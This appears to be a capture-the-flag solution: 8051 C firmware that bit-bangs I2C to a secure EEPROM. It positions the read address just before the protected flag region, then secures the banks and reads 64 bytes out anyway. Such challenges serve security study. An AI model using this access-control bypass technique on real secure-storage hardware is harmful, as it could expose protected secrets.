// Copyright 2019 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

__sfr __at(0xff) POWEROFF;
__sfr __at(0xfd) CHAROUT;
__sfr __at(0xfa) I2C_SCL;
__sfr __at(0xfb) I2C_SDA;

static const int kSEEPROMAddrMemory = 0b10100000;
static const int kSEEPROMAddrSecure = 0b01010000;

unsigned char i2c_rx_bit() {
  unsigned char sda;
  I2C_SCL = 0;
  sda = I2C_SDA;
  I2C_SCL = 1;
  return sda & 1;
}

unsigned char i2c_rx_byte() {
  int cnt = 0;
  char c = 0;
  while (cnt++ < 8) {
    I2C_SCL = 0;
    c <<= 1;
    c |= I2C_SDA;
    I2C_SCL = 1;
  }
  return c;
}

void i2c_tx_byte(unsigned char v) {
  char i;
  for (i = 7; i >= 0; i--) {
    I2C_SCL = 0;
    I2C_SDA = (v >> i) & 1;
    I2C_SCL = 1;
  }
}

void i2c_tx_start() {
  I2C_SCL = 1;
  I2C_SDA = 1;
  I2C_SDA = 0;
}

void seeprom_secure_banks(unsigned char mask) {
  i2c_tx_start();
  i2c_tx_byte(kSEEPROMAddrSecure | (mask & 0b1111));
  i2c_rx_bit();
}

void seeprom_set_address(unsigned char addr) {
  i2c_tx_start();
  i2c_tx_byte(kSEEPROMAddrMemory);
  i2c_rx_bit();
  i2c_tx_byte(addr);
  i2c_rx_bit();
}

void print(const char *message) {
  while (*message) {
    CHAROUT = *message;
    message++;
  }
}

void main(void) {
  int i;
  const int kFlagAddress = 0x40;

  print("[U] Setting address to kFlagAddress - 1\n");
  seeprom_set_address(kFlagAddress - 1);

  print("[U] Securing remaining banks\n");
  seeprom_secure_banks(0b1111);

  print("[U] Flag: ");
  i2c_tx_start();
  i2c_tx_byte(kSEEPROMAddrMemory | 1);
  i2c_rx_bit();
  for (i = 0; i < 64; i++) {
    CHAROUT = i2c_rx_byte();
    i2c_rx_bit();
  }

  print("\n[U] Powering off!\n");
  POWEROFF = 1;
}
